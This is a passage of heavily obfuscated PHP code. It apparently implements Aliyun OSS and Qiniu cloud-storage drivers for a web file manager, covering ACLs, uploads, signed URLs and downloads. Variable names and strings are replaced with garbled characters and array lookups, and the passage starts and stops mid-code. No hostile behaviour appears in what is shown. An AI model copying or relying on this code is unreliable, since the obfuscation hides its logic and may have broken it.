$•à¦˜İª[0]->getKey() != $õ½”¨°) { $®Îá¦ÏË += count($•à¦˜İª) - 1; } if (!empty($ÛÉ§¡Ô‡)) { $Ñçï–ß += count($ÛÉ§¡Ô‡); } if ($‹é¯³Å„ === $«ÏŠµàÃ[12]) { break; } continue; } if ($ß×‹ìñ) { if (!empty($•à¦˜İª)) { if (count($•à¦˜İª) > 1 || $•à¦˜İª[0]->getKey() != $õ½”¨°) { return !0; } } } else { if (!empty($ÛÉ§¡Ô‡)) { return !0; } } if ($‹é¯³Å„ === $«ÏŠµàÃ[12]) { break; } } if ($ ÎÙãÇó) { return array($«ÏŠµàÃ[239] => $®Îá¦ÏË, $«ÏŠµàÃ[240] => $Ñçï–ß); } return !1; } public function listAll($®ëÀ»Ş) { $øï€á“Ô =& $_SERVER[¿ğÚ‰±–]; $··¨½Ó = $this->fileList($®ëÀ»Ş, $øï€á“Ô[12], !0); $ÖÎäÀË = array_to_keyvalue($··¨½Ó[$øï€á“Ô[86]], $øï€á“Ô[32]); foreach ($··¨½Ó[$øï€á“Ô[85]] as $¨Í¿‡Ğ) { if (is_string($¨Í¿‡Ğ)) { $ÖÎäÀË[$¨Í¿‡Ğ] = array($øï€á“Ô[79] => 0); } } return $this->listAllFiles($®ëÀ»Ş, $ÖÎäÀË); } public function canRead($†œîÙ£õ) { $Ò”à…šÈ =& $_SERVER[¿ğÚ‰±–]; $ÈÌ²İã² = $this->pathAcl($†œîÙ£õ); return $ÈÌ²İã² == $Ò”à…šÈ[1488] || $ÈÌ²İã² == $Ò”à…šÈ[619] ? !0 : !1; } public function canWrite($òÇ€ª‰ğ) { $¬–ê¥î = $this->pathAcl($òÇ€ª‰ğ); return $¬–ê¥î == $_SERVER[¿ğÚ‰±–][619] ? !0 : !1; } public function pathAcl($Ÿ¼Á¦ÃØ) { $¢…ÃÙòÙ =& $_SERVER[¿ğÚ‰±–]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $Šü‘ôÁ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Ÿ¼Á¦ÃØ)); } catch (OSS\Core\OssException $´³¸¢şŠ) { $this->writeLog(__FUNCTION__ . $¢…ÃÙòÙ[214] . $´³¸¢şŠ->getMessage()); return !1; } $¬Ï‡ù‘• = $Šü‘ôÁ == $¢…ÃÙòÙ[37] ? $this->bucketAcl : $Šü‘ôÁ; if ($¬Ï‡ù‘• == $¢…ÃÙòÙ[1489]) { return $¢…ÃÙòÙ[1488]; } if ($¬Ï‡ù‘• == $¢…ÃÙòÙ[1490]) { return $¢…ÃÙòÙ[619]; } return $¬Ï‡ù‘•; } private function chmodPath($ï«äÜåò, $¥ÉŸæõ£ = '') { $¥¬ç¶¤… =& $_SERVER[¿ğÚ‰±–]; $Ğ™ûƒ¶— = empty($¥ÉŸæõ£) ? $¥¬ç¶¤…[1490] : $¥ÉŸæõ£; $¿‚‹¿ÍÔ = array($¥¬ç¶¤…[37], $¥¬ç¶¤…[229], $¥¬ç¶¤…[1489], $¥¬ç¶¤…[1490]); if (!in_array($Ğ™ûƒ¶—, $¿‚‹¿ÍÔ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ï«äÜåò), $Ğ™ûƒ¶—); } catch (OSS\Core\OssException $ŸÇú·¾Œ) { $this->writeLog(__FUNCTION__ . $¥¬ç¶¤…[214] . $ŸÇú·¾Œ->getMessage()); return !1; } return !0; } public function getContent($«…Øœü) { return $this->fileSubstr($«…Øœü, -1); } public function setContent($à±áëİÑ, $œÜ–Ù„¡ = '') { $Òáí¸ì« =& $_SERVER[¿ğÚ‰±–]; try { $æ‰Ì¨„ = $this->trafficLimit($Òáí¸ì«[1491]); $œùìÀî± = $this->client->putObject($this->bucket, $this->pathEncode($à±áëİÑ), $œÜ–Ù„¡, $æ‰Ì¨„); } catch (OSS\Core\OssException $’©™—£˜) { $this->writeLog(__FUNCTION__ . $Òáí¸ì«[214] . $’©™—£˜->getMessage()); return !1; } $ş†ìØÎë = array($Òáí¸ì«[1485] => trim($œùìÀî±[$Òáí¸ì«[1482]], $Òáí¸ì«[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($à±áëİÑ))); $this->updateObjMeta($à±áëİÑ, $ş†ìØÎë); return isset($œùìÀî±[$Òáí¸ì«[1492]][$Òáí¸ì«[292]]) ? !0 : !1; } private function updateObjMeta($ôÂñ»³Š, $¾‹üÎÇõ) { $ôÂñ»³Š = $this->pathEncode($ôÂñ»³Š); try { $óœ¥êã = array(OSS\OssClient::OSS_HEADERS => $¾‹üÎÇõ); $this->client->copyObject($this->bucket, $ôÂñ»³Š, $this->bucket, $ôÂñ»³Š, $óœ¥êã); } catch (OSS\Core\OssException $Øïˆ¦Ü­) { $this->writeLog(__FUNCTION__ . $_SERVER[¿ğÚ‰±–][214] . $Øïˆ¦Ü­->getMessage()); return !1; } return !0; } public function upload($©§ç—ÊÉ, $Ò’Ÿİ¢¾, $Áïû“ëã = false, $¶û¨”Ø = REPEAT_REPLACE) { $÷±õ¹È =& $_SERVER[¿ğÚ‰±–]; $¬îïÄıµ = trim($©§ç—ÊÉ, $÷±õ¹È[8]); $ƒƒ“¼ù = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($÷±õ¹È[1485] => @md5_file($Ò’Ÿİ¢¾)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($©§ç—ÊÉ))); $ƒƒ“¼ù = $this->trafficLimit($÷±õ¹È[1491], $ƒƒ“¼ù); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($¬îïÄıµ), $Ò’Ÿİ¢¾, $ƒƒ“¼ù); } catch (OSS\Core\OssException $¥ßôË“¬) { $this->writeLog(__FUNCTION__ . $÷±õ¹È[214] . $¥ßôË“¬->getMessage()); return !1; } return $this->getPathOuter($©§ç—ÊÉ); } public function getHost() { $‰¶Š¶Ü½ =& $_SERVER[¿ğÚ‰±–]; $¿Ñáˆ½Ÿ = explode($‰¶Š¶Ü½[210], parent::getHost()); return $¿Ñáˆ½Ÿ[0] . $‰¶Š¶Ü½[210] . $this->bucket . $‰¶Š¶Ü½[10] . $¿Ñáˆ½Ÿ[1]; } public function uploadFormData($¶„Äşªµ, $§ùãñƒÏ = 3600) { $Î¡¶ô¦ =& $_SERVER[¿ğÚ‰±–]; if (!($„®Ô¼íØ = $this->getHost())) { return !1; } $€©ß—İ‹ = $§ùãñƒÏ; $òûƒÙÜ½ = date($Î¡¶ô¦[1493], time() + $€©ß—İ‹); $ô¯ÛĞüÆ = new DateTime($òûƒÙÜ½); $Ù®°É«ñ = $ô¯ÛĞüÆ->format(DateTime::ISO8601); $âõà€µí = strpos($Ù®°É«ñ, $Î¡¶ô¦[372]); $Ù®°É«ñ = substr($Ù®°É«ñ, 0, $âõà€µí) . $Î¡¶ô¦[1494]; $‚ÅÀ®Ñ¯ = 1048576000 * 5; $ô·ÚÕËï = $this->pathFather($¶„Äşªµ); $ôÓôŒÊñ = array($Î¡¶ô¦[275] => $Ù®°É«ñ, $Î¡¶ô¦[278] => array(array($Î¡¶ô¦[1495], 0, $‚ÅÀ®Ñ¯), array($Î¡¶ô¦[281], $Î¡¶ô¦[282], $ô·ÚÕËï))); $¯šîÕş× = base64_encode(json_encode($ôÓôŒÊñ)); $µ¨ş¢Ÿ = base64_encode(hash_hmac($Î¡¶ô¦[263], $¯šîÕş×, $this->secret, !0)); $Ó£õßÉÔ = array($Î¡¶ô¦[293] => $¯šîÕş×, $Î¡¶ô¦[1496] => $this->accessKey, $Î¡¶ô¦[285] => $Î¡¶ô¦[274], $Î¡¶ô¦[1497] => $µ¨ş¢Ÿ, $Î¡¶ô¦[208] => $„®Ô¼íØ); $Ó£õßÉÔ = $this->trafficLimit($Î¡¶ô¦[1491], $Ó£õßÉÔ); return $Ó£õßÉÔ; } public function multiUploadFormData($ÍÈ¢”ïö, $ ©ö­Äô = 3600) { $¦ä×€¼ó =& $_SERVER[¿ğÚ‰±–]; if (!($öÀœ¿® = $this->getHost())) { return !1; } $ŒúºÃ¹ò = $this->trafficLimit($¦ä×€¼ó[1491]); $³ÄòŒ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ÍÈ¢”ïö), $ŒúºÃ¹ò); return array($¦ä×€¼ó[254] => $³ÄòŒ, $¦ä×€¼ó[208] => $öÀœ¿® . $¦ä×€¼ó[8] . $this->pathEncode($ÍÈ¢”ïö), $¦ä×€¼ó[255] => gmdate($¦ä×€¼ó[1498]), $¦ä×€¼ó[97] => $ÍÈ¢”ïö); } public function multiUploadAuthData($Öñ˜ø•—, $™¥Üé¤  = array()) { $™ÚÀÑ‰Ê =& $_SERVER[¿ğÚ‰±–]; $Èğï­‹­ = isset($™¥Üé¤ [$™ÚÀÑ‰Ê[255]]) ? $™¥Üé¤ [$™ÚÀÑ‰Ê[255]] : gmdate($™ÚÀÑ‰Ê[1498]); $ˆöØõû = isset($™¥Üé¤ [$™ÚÀÑ‰Ê[169]]) ? $™¥Üé¤ [$™ÚÀÑ‰Ê[169]] : $™ÚÀÑ‰Ê[12]; $¿¯¸£› = $Öñ˜ø•—; if (isset($™¥Üé¤ [$™ÚÀÑ‰Ê[97]])) { $¿¯¸£› = $™¥Üé¤ [$™ÚÀÑ‰Ê[97]]; unset($™¥Üé¤ [$™ÚÀÑ‰Ê[97]]); } if (isset($™¥Üé¤ [$™ÚÀÑ‰Ê[256]])) { $™¥Üé¤ [$™ÚÀÑ‰Ê[255]] = $Èğï­‹­; return $this->listUploadParts($¿¯¸£›, $™¥Üé¤ ); } $ıÏ¼›‰ = array($™ÚÀÑ‰Ê[257], $™ÚÀÑ‰Ê[12], $™ÚÀÑ‰Ê[123], $Èğï­‹­, "\170\55\x6f\x73\x73\55\144\141\164\x65\72{$Èğï­‹­}", $™ÚÀÑ‰Ê[8] . $this->bucket . $™ÚÀÑ‰Ê[8] . $¿¯¸£› . $ˆöØõû); if (strpos($ˆöØõû, $™ÚÀÑ‰Ê[258]) === 0) { $ıÏ¼›‰[0] = $™ÚÀÑ‰Ê[259]; if ($¦Áƒ¥‰¼ = $this->trafficLimit($™ÚÀÑ‰Ê[1491])) { $¿¯¸£› = $™ÚÀÑ‰Ê[1499]; array_splice($ıÏ¼›‰, 5, 0, $¿¯¸£› . $™ÚÀÑ‰Ê[4] . $¦Áƒ¥‰¼[$¿¯¸£›]); } } if (isset($™¥Üé¤ [$™ÚÀÑ‰Ê[260]]) && $™¥Üé¤ [$™ÚÀÑ‰Ê[260]] == $™ÚÀÑ‰Ê[261]) { $ıÏ¼›‰[0] = $™ÚÀÑ‰Ê[261]; } if (!empty($™¥Üé¤ [$™ÚÀÑ‰Ê[1500]])) { $Ğ®³Òöå = array_merge(array($ıÏ¼›‰[4]), $™¥Üé¤ [$™ÚÀÑ‰Ê[1500]]); sort($Ğ®³Òöå); $ıÏ¼›‰[4] = implode($™ÚÀÑ‰Ê[262], $Ğ®³Òöå); } $½ó³¢ü½ = implode($™ÚÀÑ‰Ê[262], $ıÏ¼›‰); $Îï‡Æ·é = base64_encode(hash_hmac($™ÚÀÑ‰Ê[263], $½ó³¢ü½, $this->secret, !0)); $’–Œçç = $™ÚÀÑ‰Ê[1468] . $this->accessKey . $™ÚÀÑ‰Ê[4] . $Îï‡Æ·é; if (strpos($ˆöØõû, $™ÚÀÑ‰Ê[258]) === 0) { $’–Œçç = array($™ÚÀÑ‰Ê[265] => $’–Œçç, $™ÚÀÑ‰Ê[255] => $Èğï­‹­); if ($¦Áƒ¥‰¼) { $’–Œçç = array_merge($’–Œçç, $¦Áƒ¥‰¼); } } return $’–Œçç; } public function listUploadParts($è†¥‡­­, $Š‹âÍÕà) { $²Äê¾¿³ =& $_SERVER[¿ğÚ‰±–]; $‰õ—Š¡° = parse_url_query($Š‹âÍÕà[$²Äê¾¿³[169]]); $»×˜„‡§ = $this->client->listParts($this->bucket, $this->pathEncode($è†¥‡­­), $‰õ—Š¡°[$²Äê¾¿³[254]]); $­İåâÁã = $»×˜„‡§->getListPart(); $õ÷§š¯ = array(); foreach ($­İåâÁã as $ÚÚğº’Ú) { $õ÷§š¯[] = array($²Äê¾¿³[308] => $ÚÚğº’Ú->getPartNumber(), $²Äê¾¿³[309] => trim($ÚÚğº’Ú->getETag(), $²Äê¾¿³[121])); } unset($Š‹âÍÕà[$²Äê¾¿³[256]], $Š‹âÍÕà[$²Äê¾¿³[260]]); $›µ´¾¾ = $this->multiUploadAuthData($è†¥‡­­, $Š‹âÍÕà); if (empty($›µ´¾¾)) { return !1; } return array($²Äê¾¿³[265] => $›µ´¾¾, $²Äê¾¿³[255] => $Š‹âÍÕà[$²Äê¾¿³[255]], $²Äê¾¿³[267] => $õ÷§š¯); } public function download($˜½Î°, $ßä½ˆ ) { $–”ıÁû =& $_SERVER[¿ğÚ‰±–]; if ($this->isFolder($˜½Î°)) { return !1; } try { $¶‡È‘ş‡ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ßä½ˆ ); $¶‡È‘ş‡ = $this->trafficLimit($–”ıÁû[112], $¶‡È‘ş‡); $this->client->getObject($this->bucket, $this->pathEncode($˜½Î°), $¶‡È‘ş‡); } catch (OSS\Core\OssException $ÖŸ«Âğí) { $this->writeLog(__FUNCTION__ . $–”ıÁû[214] . $ÖŸ«Âğí->getMessage()); return !1; } return $ßä½ˆ ; } public function fileSubstr($±Ìı¶Û¬, $§‘—Í¸ó = 0, $ÁßÌºÙĞ = false) { if ($§‘—Í¸ó === -1) { $è¹“á™ = array(); } else { if ($ÁßÌºÙĞ === !1) { $ïÈ´„Ê = $this->size($±Ìı¶Û¬); } else { $ïÈ´„Ê = $§‘—Í¸ó + $ÁßÌºÙĞ - 1; } $è¹“á™ = array(OSS\OssClient::OSS_RANGE => "{$§‘—Í¸ó}\x2d{$ïÈ´„Ê}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($±Ìı¶Û¬), $è¹“á™); } catch (OSS\Core\OssException $ã‹Ø™ûÉ) { $this->writeLog(__FUNCTION__ . $_SERVER[¿ğÚ‰±–][214] . $ã‹Ø™ûÉ->getMessage()); think_exception($ã‹Ø™ûÉ->getMessage()); return !1; } } private function trafficLimit($³Ì ğœ, $ùëî§í = array()) { $òí„ñ =& $_SERVER[¿ğÚ‰±–]; if ($³Ì ğœ == $òí„ñ[1491] && $this->isUploadServer() || $³Ì ğœ == $òí„ñ[112] && $this->isFileOutServer()) { return $ùëî§í; } $áÍŸã‚¿ = floatval($GLOBALS[$òí„ñ[6]][$òí„ñ[92]][$òí„ñ[110]][$³Ì ğœ]) * 1024 * 1024 * 8; if (!$áÍŸã‚¿) { return $ùëî§í; } $áÍŸã‚¿ = $áÍŸã‚¿ < 819200 ? 819200 : ($áÍŸã‚¿ > 838860800 ? 838860800 : $áÍŸã‚¿); $ùëî§í[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($áÍŸã‚¿); return $ùëî§í; } public function link($Íì¥ƒï¤, $á…’ûÓ = array()) { $Ó¡¹ÒŠ =& $_SERVER[¿ğÚ‰±–]; if (!$this->exist($Íì¥ƒï¤) || $this->isFolder($Íì¥ƒï¤)) { return !1; } try { $á…’ûÓ = $this->trafficLimit($Ó¡¹ÒŠ[112], $á…’ûÓ); $ÌÄ†œœ = $this->client->signUrl($this->bucket, $this->pathEncode($Íì¥ƒï¤), 3600 * 12, $Ó¡¹ÒŠ[261], $á…’ûÓ); return $this->getCdnLink($ÌÄ†œœ); } catch (OSS\Core\OssException $§òòÜé) { $this->writeLog(__FUNCTION__ . $Ó¡¹ÒŠ[214] . $§òòÜé->getMessage()); return !1; } } public function fileOut($ÏÀ¦”úŞ, $áÉ¶ù‚ = false, $Ö€¾£ = false, $Ã±¼‚ñû = '') { $Œêå‘±ˆ =& $_SERVER[¿ğÚ‰±–]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÏÀ¦”úŞ, $áÉ¶ù‚, $Ö€¾£, $Ã±¼‚ñû); } if (!$Ö€¾£) { $Ö€¾£ = $this->pathThis($ÏÀ¦”úŞ); } $Ö€¾£ = rawurlencode($Ö€¾£); $ÓÑ³é = get_file_mime(get_path_ext($Ö€¾£)); if ($ÓÑ³é == $Œêå‘±ˆ[248]) { return parent::fileOut($ÏÀ¦”úŞ, $áÉ¶ù‚, $Ö€¾£, $Ã±¼‚ñû); } $áÉ¶ù‚ = $áÉ¶ù‚ ? $Œêå‘±ˆ[1501] : $Œêå‘±ˆ[1502]; $ò÷è—Ú« = array(OSS\OssClient::OSS_SUB_RESOURCE => $Œêå‘±ˆ[1503] . rawurlencode("{$áÉ¶ù‚}\73\146\x69\154\x65\x6e\x61\155\x65\x3d{$Ö€¾£}")); $ò÷è—Ú«[OSS\OssClient::OSS_SUB_RESOURCE] .= $Œêå‘±ˆ[1504] . rawurlencode($ÓÑ³é); $ù¿Ñë = $this->link($ÏÀ¦”úŞ, $ò÷è—Ú«); $this->fileOutLink($ù¿Ñë); } public function fileOutServer($¾ØÜ¹¬å, $Ã¥ì”Ì¿ = false, $ÉñîÌ¿· = false, $¸ŞšŒÖ = '') { parent::fileOut($¾ØÜ¹¬å, $Ã¥ì”Ì¿, $ÉñîÌ¿·, $¸ŞšŒÖ); } public function fileOutImage($ÎÁñßÉÊ, $ÉëÓ£Ñ¡ = 250) { if ($this->size($ÎÁñßÉÊ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ÎÁñßÉÊ, $ÉëÓ£Ñ¡); } $øÁâ¹ÈË = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¿ğÚ‰±–][1465] . $ÉëÓ£Ñ¡); $îËÀÏ¹¼ = $this->link($ÎÁñßÉÊ, $øÁâ¹ÈË); $this->fileOutLink($îËÀÏ¹¼); } public function fileOutImageServer($ÄŠ„ˆı , $Œè‚©é› = 250) { parent::fileOutImage($ÄŠ„ˆı , $Œè‚©é›); } public function fileOutLink($œ‘½¤…) { $ıø•¾ö¶ =& $_SERVER[¿ğÚ‰±–]; if (!$this->isCdnHost() && substr($œ‘½¤…, 0, 7) == $ıø•¾ö¶[313]) { $œ‘½¤… = $ıø•¾ö¶[314] . substr($œ‘½¤…, 7); } header($ıø•¾ö¶[175] . $œ‘½¤…); die; } public function hashMd5($óûê”Õ, $’“Àş†‰ = '') { $İ·İƒù =& $_SERVER[¿ğÚ‰±–]; $¥É†‚Ÿí = $this->_objectMeta($óûê”Õ); if (!$¥É†‚Ÿí) { return $İ·İƒù[12]; } if (!isset($¥É†‚Ÿí[$İ·İƒù[1485]]) && !empty($’“Àş†‰)) { $¼¼¸¥ŞÈ = $this->updateObjMeta($óûê”Õ, array($İ·İƒù[1485] => $’“Àş†‰)); $¥É†‚Ÿí[$İ·İƒù[1485]] = $¼¼¸¥ŞÈ ? $’“Àş†‰ : $İ·İƒù[12]; } return isset($¥É†‚Ÿí[$İ·İƒù[1485]]) ? strtolower($¥É†‚Ÿí[$İ·İƒù[1485]]) : $İ·İƒù[12]; } public function size($¥§â·¥Ù) { $½‘·³å€ = $this->objectMeta($¥§â·¥Ù); return $½‘·³å€ ? $½‘·³å€[$_SERVER[¿ğÚ‰±–][79]] : 0; } public function info($˜‘•ÄÓ¨) { if ($this->isFolder($˜‘•ÄÓ¨)) { return $this->folderInfo($˜‘•ÄÓ¨); } else { if ($this->isFile($˜‘•ÄÓ¨)) { return $this->fileInfo($˜‘•ÄÓ¨); } } return !1; } public function exist($»£¾ô®) { return $this->isFile($»£¾ô®) || $this->isFolder($»£¾ô®); } public function isFile($ßñË¹à˜) { return !$this->isFolder($ßñË¹à˜) && $this->objectMeta($ßñË¹à˜); } public function isFolder($À¾èŞ ) { return $this->cacheMethod($_SERVER[¿ğÚ‰±–][179], $À¾èŞ ); } protected function objectMeta($À »”è¦) { return $this->cacheMethod($_SERVER[¿ğÚ‰±–][181], $À »”è¦); } protected function _objectMeta($¦¦ó•«Ã) { $äÊŞ˜µ¶ =& $_SERVER[¿ğÚ‰±–]; try { $€À³ï À = $this->client->getObjectMeta($this->bucket, $this->pathEncode($¦¦ó•«Ã)); } catch (OSS\Core\OssException $Êˆ€á¾ª) { $this->writeLog(__FUNCTION__ . $äÊŞ˜µ¶[214] . $Êˆ€á¾ª->getMessage()); $€À³ï À = !1; } if ($€À³ï À) { $€À³ï À[$äÊŞ˜µ¶[79]] = intval($€À³ï À[$äÊŞ˜µ¶[1483]]); } return $€À³ï À; } protected function _isFolder($ê´åæ‰ğ) { $ô©±ª =& $_SERVER[¿ğÚ‰±–]; if ($ê´åæ‰ğ == $ô©±ª[12] || $ê´åæ‰ğ == $ô©±ª[8]) { return !0; } $ú£‘œ€ = array($ô©±ª[1478] => $ô©±ª[8], $ô©±ª[1479] => rtrim($ê´åæ‰ğ, $ô©±ª[8]) . $ô©±ª[8], $ô©±ª[1480] => 1, $ô©±ª[1481] => $ô©±ª[12]); $øÚõÔ¢” = $this->client->listObjects($this->bucket, $ú£‘œ€); if ($øÚõÔ¢”->getObjectList() || $øÚõÔ¢”->getPrefixList()) { return !0; } return !1; } public function writeLog($›ïş«ÒÕ = '', $ÚÂê’û¨ = false) { $ô’¾à¸ =& $_SERVER[¿ğÚ‰±–]; $õÊ‘ûèÈ = in_array(ACTION, array($ô’¾à¸[212], $ô’¾à¸[213])); if (!$õÊ‘ûèÈ && !GLOBAL_DEBUG) { return; } $àı¹€§ = 0; if (stripos($›ïş«ÒÕ, $ô’¾à¸[1505]) !== !1) { $àı¹€§ = 1; $Û”¤Øº = explode($ô’¾à¸[1506], $›ïş«ÒÕ); $›ïş«ÒÕ = !empty($Û”¤Øº[1]) ? $Û”¤Øº[1] : $›ïş«ÒÕ; } else { if (stripos($›ïş«ÒÕ, $ô’¾à¸[1507])) { $àı¹€§ = 2; $Û”¤Øº = explode($ô’¾à¸[1507], $›ïş«ÒÕ); $Û”¤Øº = explode($ô’¾à¸[4], $Û”¤Øº[0]); $›ïş«ÒÕ = !empty($Û”¤Øº[1]) ? $Û”¤Øº[1] : $›ïş«ÒÕ; } } if ($õÊ‘ûèÈ && I18n::getType() == $ô’¾à¸[1508]) { if ($àı¹€§ == 1) { $›ïş«ÒÕ = str_replace($ô’¾à¸[1509], $ô’¾à¸[1510], $›ïş«ÒÕ); } else { if ($àı¹€§ == 2) { $Û”¤Øº = explode($ô’¾à¸[214], $Û”¤Øº[0]); $Àıú…¢Ù = isset($Û”¤Øº[1]) ? $Û”¤Øº[1] : $ô’¾à¸[12]; $ùÅØµºÊ = array($ô’¾à¸[1511] => $ô’¾à¸[1512], $ô’¾à¸[1513] => $ô’¾à¸[1514], $ô’¾à¸[1515] => $ô’¾à¸[1516], $ô’¾à¸[1517] => $ô’¾à¸[1518], $ô’¾à¸[1519] => $ô’¾à¸[1520], $ô’¾à¸[1521] => $ô’¾à¸[1522], $ô’¾à¸[1523] => $ô’¾à¸[1524], $ô’¾à¸[1525] => $ô’¾à¸[1526], $ô’¾à¸[1527] => $ô’¾à¸[1528], $ô’¾à¸[1529] => $ô’¾à¸[1530]); if (isset($ùÅØµºÊ[$Àıú…¢Ù])) { $›ïş«ÒÕ = $ùÅØµºÊ[$Àıú…¢Ù]; } } } if (stripos($›ïş«ÒÕ, $ô’¾à¸[1531])) { $›ïş«ÒÕ = $ô’¾à¸[1532]; } } if (!trim($›ïş«ÒÕ)) { return; } parent::writeLog(trim($›ïş«ÒÕ), $ÚÂê’û¨); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($Üøê«Šæ) { parent::__construct(); require_once SDK_DIR . $_SERVER[¿ğÚ‰±–][1533]; $this->_init($Üøê«Šæ); } public function _init($ôé©Ï³ú) { $ó†³á² =& $_SERVER[¿ğÚ‰±–]; $this->config = $ôé©Ï³ú; foreach ($ôé©Ï³ú as $ãä±€Õ– => $ãÈ¯è½Ÿ) { if (isset($this->{$ãä±€Õ–})) { $this->{$ãä±€Õ–} = $ãÈ¯è½Ÿ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ó†³á²[1534] . LNG($ó†³á²[1469])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($µõôÍÓ¸, $–¶•Íª¢ = '', $ÆÃùè = REPEAT_RENAME) { if ($this->setContent($µõôÍÓ¸, $–¶•Íª¢)) { return $this->getPathOuter($µõôÍÓ¸); } return !1; } public function mkdir($—™Ò¦çÍ, $¨£¶¢ıÑ = REPEAT_SKIP) { $óù„Œ—ş =& $_SERVER[¿ğÚ‰±–]; $úğ…´¯Í = trim($—™Ò¦çÍ, $óù„Œ—ş[8]); if ($this->_isFolder($úğ…´¯Í)) { return $this->getPathOuter($úğ…´¯Í); } $—™Ò¦çÍ = $úğ…´¯Í . $óù„Œ—ş[8]; $¤¼¹ÑÖ = get_path_this($úğ…´¯Í); $¡ÆÖ„õ¹ = $—™Ò¦çÍ . $¤¼¹ÑÖ; if (!$this->mkfile($¡ÆÖ„õ¹)) { return !1; } if (!$this->moveFile($¡ÆÖ„õ¹, $—™Ò¦çÍ)) { $this->delFile($¡ÆÖ„õ¹); return !1; } return $this->getPathOuter($úğ…´¯Í); } public function copyFile($êâ·“, $—’¸Ìö›) { $Å®ş–™Å = $this->bucketManager->copy($this->bucket, $êâ·“, $this->bucket, $—’¸Ìö›, !0); return $Å®ş–™Å ? !1 : $this->getPathOuter($—’¸Ìö›); } public function moveFile($Ç²òô—à, $ù±œÂ‚£) { $¦üğëà = $this->bucketManager->move($this->bucket, $Ç²òô—à, $this->bucket, $ù±œÂ‚£, !0); return $¦üğëà ? !1 : $this->getPathOuter($ù±œÂ‚£); } public function delFile($¾Êİ¶Œ¤) { if (!$this->exist($¾Êİ¶Œ¤)) { return !0; } $ŒÕø™øö = $this->bucketManager->delete($this->bucket, $¾Êİ¶Œ¤); return $ŒÕø™øö ? !1 : !0; } public function delFolder($ØãÛ‹Õâ) { $Á‘‘×„Î =& $_SERVER[¿ğÚ‰±–]; if (!$this->exist($ØãÛ‹Õâ)) { return !0; } $this->listItemCache = !1; $İ½ÙÇ¼½ = $this->fileList($ØãÛ‹Õâ); $this->listItemCache = !0; $×¡òÙâş = trim($ØãÛ‹Õâ, $Á‘‘×„Î[8]) . $Á‘‘×„Î[8]; if (!empty($ØãÛ‹Õâ) && $ØãÛ‹Õâ !== $Á‘‘×„Î[228] && !in_array($×¡òÙâş, $İ½ÙÇ¼½[$Á‘‘×„Î[85]])) { $İ½ÙÇ¼½[$Á‘‘×„Î[85]][] = $×¡òÙâş; } $ÍàïÉÊé = $this->delByBatch($İ½ÙÇ¼½[$Á‘‘×„Î[86]]); if (!$ÍàïÉÊé) { return !1; } $ÍàïÉÊé = $this->delByBatch($İ½ÙÇ¼½[$Á‘‘×„Î[85]]); if (!$ÍàïÉÊé) { return !1; } return $this->delFile($×¡òÙâş); } private function delByBatch($™éù™˜¤) { foreach (array_chunk($™éù™˜¤, 1000) as $²»îÇ¢») { $ßùä£°ƒ = $this->bucketManager->buildBatchDelete($this->bucket, $²»îÇ¢»); list($‡Şóïˆ±, $Æ¯‹çÙ…) = $this->bucketManager->batch($ßùä£°ƒ); if ($Æ¯‹çÙ…) { return !1; } } return !0; } public function rename($–ê‚²ğä, $»¸ƒËó¹) { return $this->renameObject($–ê‚²ğä, $»¸ƒËó¹); } public function fileInfo($ÆÅıØ«—, $Ñùñ¹ûù = false, $ÃÚˆš½ = array()) { $Úß²Çµ =& $_SERVER[¿ğÚ‰±–]; $‚ïêÃù‚ = array($Úß²Çµ[32] => $this->pathThis($ÆÅıØ«—), $Úß²Çµ[87] => $this->getPathOuter($Úß²Çµ[8] . $ÆÅıØ«—), $Úß²Çµ[33] => $Úß²Çµ[230], $Úß²Çµ[79] => isset($ÃÚˆš½[$Úß²Çµ[1535]]) ? $ÃÚˆš½[$Úß²Çµ[1535]] : 0, $Úß²Çµ[169] => $this->ext($ÆÅıØ«—)); if ($Ñùñ¹ûù) { return $‚ïêÃù‚; } $‚ïêÃù‚[$Úß²Çµ[231]] = $‚ïêÃù‚[$Úß²Çµ[88]] = 0; $‚ïêÃù‚[$Úß²Çµ[232]] = $‚ïêÃù‚[$Úß²Çµ[233]] = !0; if (empty($ÃÚˆš½)) { $ÃÚˆš½ = $this->objectMeta($ÆÅıØ«—); if (!$ÃÚˆš½) { return $‚ïêÃù‚; } } if (isset($ÃÚˆš½[$Úß²Çµ[234]]) && $ÃÚˆš½[$Úß²Çµ[234]]) { $‚ïêÃù‚[$Úß²Çµ[235]] = $ÃÚˆš½[$Úß²Çµ[234]]; } if (isset($ÃÚˆš½[$Úß²Çµ[245]]) && $ÃÚˆš½[$Úß²Çµ[245]]) { $‚ïêÃù‚[$Úß²Çµ[235]] = $ÃÚˆš½[$Úß²Çµ[245]]; } if (isset($ÃÚˆš½[$Úß²Çµ[1536]])) { $‚ïêÃù‚[$Úß²Çµ[88]] = substr($ÃÚˆš½[$Úß²Çµ[1536]] . $Úß²Çµ[12], 0, 10); } if (isset($ÃÚˆš½[$Úß²Çµ[1535]])) { $‚ïêÃù‚[$Úß²Çµ[79]] = 